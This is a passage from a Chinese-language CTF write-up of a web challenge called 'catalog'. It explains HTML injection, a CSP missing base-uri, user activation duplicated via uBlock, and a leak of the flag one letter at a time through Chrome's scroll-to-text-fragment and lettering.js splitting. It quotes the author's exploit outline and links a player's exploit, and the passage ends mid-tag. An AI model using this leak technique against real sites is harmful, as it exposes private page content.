P9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423014836.png" alt=""></p></li><li><p>在提交 issue 处，有一项需要提交 image URL 的地方也存在着 HTML 注入</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423021048.png" alt=""></p></li><li><p>题目设置还会利用 session 来存储一些 HTML 元素，例如我们在同一个 session 先登录，再用这个 session 发送一个登录失败的请求，刷新我们已登录的页面我们就可以看到：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424222148.png" alt=""></p></li></ol><h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><p></p><figure class="highlight csp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">'nonce-xhncdWd319Yj3acHJbKoEWmK8stBxy88'</span>; <span class="hljs-keyword">img-src</span> *; <span class="hljs-keyword">font-src</span> <span class="hljs-string">'self'</span> fonts.gstatic.com; <span class="hljs-keyword">frame-src</span> https://www.google.com/recaptcha/</span><br></pre></td></tr></tbody></table></figure><p></p><p>题目给的 CSP 是这些，这些 CSP 限制了我们插入的代码执行，但是也很明显，这里并没有设置 base-uri ，所以我们可以试图利用 HTML 注入点，利用<code>&lt;base&gt;</code>来进行 XSS ，但是并不像 RCTF 2018 rblog 那道题，这道题的插入点在比较靠后的地方，没有办法控制之前引入文件的 url ，所以没有办法利用 base uri 的思路来进行 XSS </p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><blockquote><p>Catalog has two injections: the image tag on the issue page and the username when you fail to login.  Use the image tag one with a meta redirect to get offsite.  Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.  Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.  Now make a no-cors POST to use the failed login injection, then send them to issue.php?id=3.  So now we have arbitrary content with a user activation on the correct page, but still no code exec.  (…the rest of the exploit to come in a moment…)</p><p>(…continuation of previous post…) Ok, but what can we do?  A recent addition to Chromium was scroll-to-text-fragment, which lets you search the page for text (in entire words only) and scroll to it, <em>though this consumes the user activation</em>.  If you could search for a letter at a time, then you could use your injection to add a bunch of whitespace and a lazy-loading image to detect the scroll.It turns out you can: the whole-word match counts tag boundaries as word boundaries, and the <code>&lt;em&gt;</code> tag gets split into a <code>&lt;span&gt;</code> for each individual letter on load!  So you can do text searches of the form <code>#:~:text=F-,{,-X</code> for example to search for an X at the beginning of the flag.  You can specify multiple text searches to do a binary search across the whole alphabet.  Also include a meta refresh to send back offsite again after a short delay and you can leak ~5 characters per captcha.  Repeat 5 or 6 times to get the whole flag.</p></blockquote><p>这一段是赛后 @bluepichu 在 irc 上说的一段话，也算是对 catalog 这道题目的分析，也算是简短的 wp 。</p><p>同时，@lbherrera_ 在赛后发了一个推特公开了他一部分本题的 exp :</p><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/lbherrera_/status/1251994130298875904" target="_blank" rel="noopener"></a></blockquote></div><script async="" defer="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>Exp 地址在: <a href="https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b" target="_blank" rel="noopener">https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b</a></p><p>但是比较遗憾的是，该作者到目前为止还并未发布他自己的 write up ，如果大家能看懂这些，那么这个题后面的部分大家就可以直接跳过了，后文也就是基本按照这个大致的思路来分析这个题的。    </p><h3 id="User-Activation"><a href="#User-Activation" class="headerlink" title="User Activation"></a>User Activation</h3><p><strong>这部分由于自己的理解也不是特别深刻，所以只是比较粗浅的个人理解，如有错误，还请师傅直接指出。</strong></p><p><strong>本部分参考主要是两个文档：<a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank" rel="noopener">User Activation v2</a>、<a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank" rel="noopener">User Activation v2 (UAv2)</a>，如果师傅们对英文阅读理解比较好，更建议看原文</strong></p><p>‘User Activation’ 这个词看起来比较的关键，出现在了作者的解释以及 hint 当中，但是为什么作者放 hint 要特意给 ‘User Activation’ 这个词而不是相对于更像通俗的 ‘User Interaction’ 呢？</p><p>随便搜一下我们可以知道 ‘User Activation’ 其实算是一个术语：</p><blockquote><p>​    User activation is the mechanism to maintain active-user-interaction state that limits use of “abusable” APIs (e.g. opening popups or vibrating).</p></blockquote><p>简而言之，User Activation(我们暂且称为“用户激活状态”)，是为了保持用户主动进行交互的状态，限制了一些被恶意使用的 API ，比如弹窗或者震动。”激活 “状态通常意味着用户当前通过某种输入机制（打字、点击鼠标等）与页面进行交互，或者用户在页面加载后完成了某种交互。</p><p>浏览器通过用户激活这种状态来控制对被恶意使用的 API 访问，这种 API 最明显的例子就是通过<code>window.open()</code>打开弹出窗口。当出现一些流氓开发者开始恶意使用该 API 任意弹窗后，大多数浏览器加入了在用户未主动与页面交互时阻止弹窗的功能，从那时起，浏览器逐渐使许多其他 API 依赖于用户激活（更准确地说，使它们受用户激活控制），比如全屏、震动，自动播放媒体等， Chrome 中约有30种不同的 API 由用户激活控制。</p><h3 id="uBlock"><a href="#uBlock" class="headerlink" title="uBlock"></a>uBlock</h3><blockquote><p>uBlock Origin (or uBlock₀) is not an <em>ad blocker</em>; it’s a general-purpose blocker. uBlock Origin blocks ads through its support of the <a href="https://adblockplus.org/en/filters" target="_blank" rel="noopener">Adblock Plus filter syntax</a>. uBlock Origin <a href="https://github.com/gorhill/uBlock/wiki/Filter-syntax-extensions" target="_blank" rel="noopener">extends</a> the syntax and is designed to work with custom rules and filters. Furthermore, advanced mode allows uBlock Origin to work in <a href="https://github.com/gorhill/uBlock/wiki/Dynamic-filtering:-default-deny" target="_blank" rel="noopener">default-deny mode</a>, which mode will cause <a href="https://requestpolicycontinued.github.io/#what-are-cross-site-requests" target="_blank" rel="noopener">all 3rd-party network requests</a> to be blocked by default, unless allowed by the user.</p></blockquote><p>简单来说，uBlock 是一个通用的 blocker ，通过各种自定义规则来配合过滤页面元素，更多的可以到 <a href="https://github.com/gorhill/uBlock" target="_blank" rel="noopener">uBlock</a> 仓库查看。</p><p><del>个人也并没有非常理解作者在此处引入 uBlock 的点，以及配合 User Activation 的出题意图，虽然作者解释了他的出题意图</del>：</p><blockquote><p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.  Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.    </p></blockquote><p>就在我写这段话的时候我幡然醒悟，这个 uBlock 的引入对传递 User Activation 极为重要，为什么这么说呢？因为它对于我们接下里要引入的一个概念有着十分重要的联系！所以这里暂且我们把 uBlock + User Activation 的概念以及利用放一放，我们接下来看看怎么获取 flag 。</p><h3 id="How-to-get-the-FLAG"><a href="#How-to-get-the-FLAG" class="headerlink" title="How to get the FLAG"></a>How to get the FLAG</h3><ol><li>存在 CSP 限制</li><li>Admin 会点击我们的 issue 链接</li><li>Flag 在同域的另一个页面：<a href="http://catalog.pwni.ng/issue.php?id=3" target="_blank" rel="noopener">http://catalog.pwni.ng/issue.php?id=3</a></li></ol><p>我们可以由 1) 知道，一些利用 scirpt 的跳转就失效了，但是我们可以利用如下形式进行页面跳转：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"refresh"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"0;URL='http://url/'"</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以利用的是两个 HTML 注入，而且 image url 处的注入还是存储型的。</p><p>假设如果允许我们执行 script 代码的话，我们可以利用两个 iframe ，一个 iframe 指向我们可以执行的 js 页面，另外一个 iframe 指向 flag 的页面，通过 js 来获取同域下的另一个 iframe 的内容，这也算是常用的 csrf 的一种操作，可以参考 Byte Bandits CTF 2020 - Notes App 的解法，这里就不再赘述了。</p><p>如果能插入 script 执行就好了，可惜插不得。</p><h3 id="Text-Fragments"><a href="#Text-Fragments" class="headerlink" title="Text Fragments"></a>Text Fragments</h3><p>反手看一手 Chrome 新特性，闷声发大财。</p><p>众所周知，CTF 出题人会有事没事去看看 php 源码 or chrome new features ，所以：<a href="https://developers.google.com/web/updates/2020/02/nic80#more" target="_blank" rel="noopener">New in Chrome 80</a></p><blockquote><p>Of course, there’s plenty more!</p><ul><li>You can now link directly to text fragments on a page, by using <code>#:~:text=something</code>. Chrome will scroll to and highlight the first instance of that text fragment. For example [<a href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York]" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York]</a>(<a href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rickrolling#:~:text=New</a> York)</li></ul></blockquote><p>Scroll To Text Fragment: <a href="https://chromestatus.com/feature/4733392803332096" target="_blank" rel="noopener">https://chromestatus.com/feature/4733392803332096</a></p><blockquote><p>​    This feature allows a user or author to link to a specific portion of a page, using a text snippet provided in the URL. When the page is loaded, the browser highlights the text and scrolls it into view.</p></blockquote><p>简单来说，Chrome 在今年2月份的更新推出了一个新特性，这个特性能让我们用形如<code>#:~:text=something</code>的样式来滑动到该页面<code>something</code>字符串的位置，并将其高亮，赋予了字符串类似一个 anchor 锚标签的作用。</p><p>具体的使用师傅们可以参考文档 <a href="https://wicg.github.io/ScrollToTextFragment/" target="_blank" rel="noopener">Text Fragments</a> ，这里我只择取我们需要的来说：</p><ul><li><p>匹配模式：</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#:~:text=[prefix-,]textStart[,textEnd][,-suffix]</span></span><br><span class="line">          context  |<span class="hljs-string">-------match-----</span>|<span class="hljs-string">  context</span></span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>前缀跟跟后缀只是为了限制上下文，真正匹配的还是中间的 textStart &amp; textEnd</p></li><li><p>需要完整匹配一个单词，无法匹配单词中的单个字母。</p><blockquote><p>Example 12</p><p>“range” will match in “mountain range” but not in “color orange” nor “forest ranger”.</p></blockquote></li><li><p>单词需要在一个完整的块里面：</p><blockquote><p>Example 11</p><p></p><figure class="highlight asciidoc hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">:~:text=The</span> quick,lazy dog</span><br></pre></td></tr></tbody></table></figure><p></p><p>will fail to match in</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>The<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>quick brown fox<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>jumped over the lazy dog<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>because the starting string “The quick” does not appear within a single, uninterrupted block. The instance of “The quick” in the document has a block element between “The” and “quick”.</p><p>It does, however, match in this example:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>The quick brown fox<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>jumped over the lazy dog<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote></li></ul><p>所以我们可以有个想法利用这个新特性去匹配到 flag ，但是一系列的问题来了：</p><ul><li>如果 flag 是 PCTF{TEST} ，我们用<code>#:~:text=P-,C,T,-F</code>是匹配不到的，因为它不能匹配到单词的单个字母</li><li>即使我们能匹配到了，怎么样判断我们匹配到了呢？</li></ul><h3 id="Lettering"><a href="#Lettering" class="headerlink" title="Lettering"></a>Lettering</h3><p>按照上述思路，我们貌似得找个办法拆分这个字符串，其实出题人已经很贴心地为我们做好了：</p><p>这是页面所引入的文件：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.7.0/jquery.lettering.min.js"</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://www.google.com/recaptcha/api.js?render=6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y"</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/js/main.js"</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>其中引入了 jquery.lettering.min.js ，并且 main.js 有如下代码</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="hljs-string">"em"</span>).lettering();</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以在 lettering.js 的文档中看到 <a href="https://github.com/davatron5000/Lettering.js/wiki/Wrapping-letters-with-lettering()" target="_blank" rel="noopener">Lettering.js wiki - Wrapping letters with lettering()</a></p><blockquote><p>We’ll start with some really basic markup:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fancy_title"</span>&gt;</span>Some Title<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>After including jQuery, <a href="http://github.com/davatron5000/Lettering.js/downloads" target="_blank" rel="noopener">download and include the latest minified version of Lettering.js</a>, then a script block with the magical <code>.lettering()</code> method:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"path/to/jquery.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"path/to/jquery.lettering.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">$(<span class="hljs-built_in">document</span>).ready(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-javascript">  $(<span class="hljs-string">".fancy_title"</span>).lettering();</span></span><br><span class="line">});</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>The resulting code will churn your <code>.fancy_title</code> and output the following:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fancy_title"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char1"</span>&gt;</span>S<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char2"</span>&gt;</span>o<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char3"</span>&gt;</span>m<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char4"</span>&gt;</span>e<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char5"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char6"</span>&gt;</span>T<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char7"</span>&gt;</span>i<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char8"</span>&gt;</span>t<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char9"</span>&gt;</span>l<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"char10"</span>&gt;</span>e<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p>所以我们只需要在页面加入一个<code>&lt;em&gt;</code>标签，即可把内容拆分为单个字母，效果如下：</p><p><img 